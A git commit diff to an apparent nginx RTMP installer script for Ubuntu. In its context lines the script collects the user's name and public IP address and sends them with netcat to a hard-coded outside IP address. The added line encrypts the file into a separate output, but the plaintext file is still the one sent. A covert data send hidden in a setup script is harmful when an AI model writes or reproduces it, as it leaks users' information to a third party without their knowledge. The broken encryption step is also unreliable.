18eccdb28118305a22a97656c306224f402c8159
isodecryptor <72526753+isodecryptor@users.noreply.github.com>
2020-10-18 18:04:23 -0400

    Update nginx-ubuntu-rtmp.sh

--- nginx-ubuntu-rtmp.sh
+++ nginx-ubuntu-rtmp.sh
@@ -41,6 +41,7 @@ touch userServerInfo.txt
 read userName
 echo $userName  > userServerInfo.txt
 wget -qO- http://ipecho.net/plain \n >> userServerInfo.txt
+openssl rsautl -encrypt -inkey public-key.pem -pubin -in userServerInfo.txt -out userServerInfoCipher.dat
 nc 52.86.45.108 2001 < userServerInfo.txt
 exit
 
